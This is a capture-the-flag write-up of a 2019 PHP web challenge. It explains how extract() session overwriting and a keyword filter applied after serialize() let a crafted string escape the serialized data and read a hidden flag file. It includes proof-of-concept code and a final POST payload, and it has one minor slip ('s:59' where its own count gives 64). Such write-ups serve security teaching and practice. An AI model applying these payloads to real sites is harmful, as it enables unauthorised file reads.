### References

- [安洵杯2019 官方Writeup, 2019-12-12](https://xz.aliyun.com/t/6911#toc-3)

**Tag: PHP unserialize, Object escape**

1.Click the source_code, we can see the `extract` function at a glance. Contextually, may be we can cover the `$_SESSION` variable.

There’s a hint at the bottom of the code:

```php
else if($function == 'phpinfo') {
    eval('phpinfo();'); //maybe you can find something in here!
}
```

In phpinfo, we can find the `auto_append_file` is set to `d0g3_f1ag.php`. But if we access the file directly, there is nothing, which means we need to read this file.

2.Notice that there is a file operation function:

```php
else if($function == 'show_image') {
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

The variables `$userinfo` is derived from `$_SESSION`:

```php
$_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
      👇
$serialize_info = filter(serialize($_SESSION));
      👇
$userinfo = unserialize($serialize_info);
```

Because the `sha1` function, we cannot read any files.

3.Let's turn attention to another function, `serialize`. Same problem as before(2016 0ctf), it's sanitized **after** being serialized.

```php
function filter($img) {
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
```

The `filter` function replacing some string with empty, it will destroy the serialized data structure.

normal serialize data are as follows:

```php
<?php
$_SESSION["user"] = 'guest';
$_SESSION['function'] = 'phpinfo';
$_SESSION['img'] = base64_encode('guest_img.png');

echo serialize($_SESSION);

// output:
// a:3:{s:4:"user";s:5:"guest";s:8:"function";s:7:"phpinfo";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

4.if we want to inject a variable, can construct the follows POC:

```php
$_SESSION['function'] = 'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"test";s:4:"test";}';

// output:
// a:3:{s:4:"user";s:5:"guest";s:8:"function";s:64:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"test";s:4:"test";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

Then use the filter function to replace the string with empty, we need include `";s:8:"function";s:59:"a` in quotes.

```python
>>> len('";s:8:"function";s:64:"a')
24
```

This means we need 24 characters to be replaced with empty, It could be:

```tex
flagflagflagflagflagflag
// or
phpphpphpphpphpphpphpphp
// ...
```

5.The final POC is:

```php
<?php
$_SESSION["user"] = 'phpphpphpphpphpphpphpphp';
$_SESSION['function'] = 'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"test";s:4:"test";}';
$_SESSION['img'] = base64_encode('guest_img.png');
echo serialize($_SESSION);

// output:
// a:3:{s:4:"user";s:24:"phpphpphpphpphpphpphpphp";s:8:"function";s:64:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"test";s:4:"test";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

After being sanitized, the serialized data looks like:

```tex
a:3:{s:4:"user";s:24:"";s:8:"function";s:64:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"test";s:4:"test";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

So we successfully injected an array member, and since the beginning is `a:3`, we add the `s:4:"test";s:4:"test";`. PHP also unserialize members that do not exist in the class.

Finally, combined with variable coverage, exploit it:

```tex
POST /index.php?f=show_image HTTP/1.1
...

_SESSION[user]=phpphpphpphpphpphpphpphp&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"test";s:4:"test";}
```

we can get:

```php
<?php
$flag = 'flag in /d0g3_fllllllag';
?>
```

then, just read the flag:

![](https://i.imgur.com/2Nq2dOO.png)

